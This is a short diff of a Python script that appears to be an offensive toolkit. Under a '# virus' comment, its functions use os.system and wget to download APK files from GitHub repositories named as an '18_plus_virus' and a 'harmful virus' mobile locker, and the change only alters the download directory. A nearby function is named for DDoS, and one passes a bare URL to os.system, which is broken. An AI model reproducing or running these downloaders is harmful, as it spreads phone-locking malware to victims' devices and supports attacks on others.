@@ -116,11 +116,11 @@ def foxddoser():
 
 # virus
 def love():
-    os.system("cd $HOME && mkdir Cyber-D_Virus && cd Cyber-D_Virus && wget https://github.com/kdo2064/18_plus_virus/blob/main/%2B18%20virus/Love_1.0.apk")
+    os.system("cd Cyber-D-Virus && wget https://github.com/kdo2064/18_plus_virus/blob/main/%2B18%20virus/Love_1.0.apk")
 
 
 def loveyekpal():
-    os.system("cd $HOME && mkdir Cyber-D_Virus && cd Cyber-D_Virus && wget https://github.com/kdo2064/Love_ek_Pal_Ka_Mobile_Locker/blob/main/harmful%20virus/Love%20ek%20Pal%20Ka.apk")
+    os.system("cd Cyber-D-Virus && wget https://github.com/kdo2064/Love_ek_Pal_Ka_Mobile_Locker/blob/main/harmful%20virus/Love%20ek%20Pal%20Ka.apk")
 
 def kingofking():
     os.system("https://kdo2064.github.io/King-of-King/  > /dev/null 2>&1 &")
